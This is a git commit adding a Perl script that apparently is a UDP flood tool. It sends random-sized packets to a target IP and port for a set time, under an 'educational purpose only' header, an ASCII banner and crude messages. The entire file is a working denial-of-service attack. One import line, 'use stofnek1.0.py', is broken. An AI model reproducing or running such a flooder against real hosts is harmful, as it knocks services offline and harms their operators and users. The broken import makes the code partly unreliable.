bfd0858904d1a6c3726d99929d1bd03c8603f305
stofnek <59692377+stofnek@users.noreply.github.com>
2020-09-09 15:23:14 +0200

    Add files via upload

---
+++ stofnek.pl
@@ -0,0 +1,43 @@
+###Stofnek#0001#######
+###For educational purpose only#####
+
+
+
+
+use Term::ANSIColor qw(:constants);
+    $Term::ANSIColor::AUTORESET = 2;
+
+
+
+use Socket;
+use strict;
+use stofnek1.0.py
+
+my ($ip,$port,$size,$time) = @ARGV;
+
+my ($iaddr,$endtime,$psize,$pport);
+
+$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
+$endtime = time() + ($time ? $time : 100);
+socket(flood, PF_INET, SOCK_DGRAM, 17);
+
+print BOLD GREEN<<EOTEXT;
+          __          _____              __    
+  _______/  |_  _____/ ____\____   ____ |  | __
+ /  ___/\   __\/  _ \   __\/    \_/ __ \|  |/ /
+ \___ \  |  | (  <_> )  | |   |  \  ___/|    < 
+/____  > |__|  \____/|__| |___|  /\___  >__|_ \
+     \/                        \/     \/     \/
+		So whatsup?
+EOTEXT
+
+print "Packets sent to $ip " . ($port ? $port : "random") . " port with " . 
+  ($size ? "$size-byte" : "random size") . " packets" . 
+  ($time ? " for $time seconds" : "") . "\n";
+print "Stop Eating DILDO with Ctrl-C\n" unless $time;
+ 
+for (;time() <= $endtime;) {
+  $psize = $size ? $size : int(rand(1024-64)+64) ;
+  $pport = $port ? $port : int(rand(65500))+1;
+ 
+  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
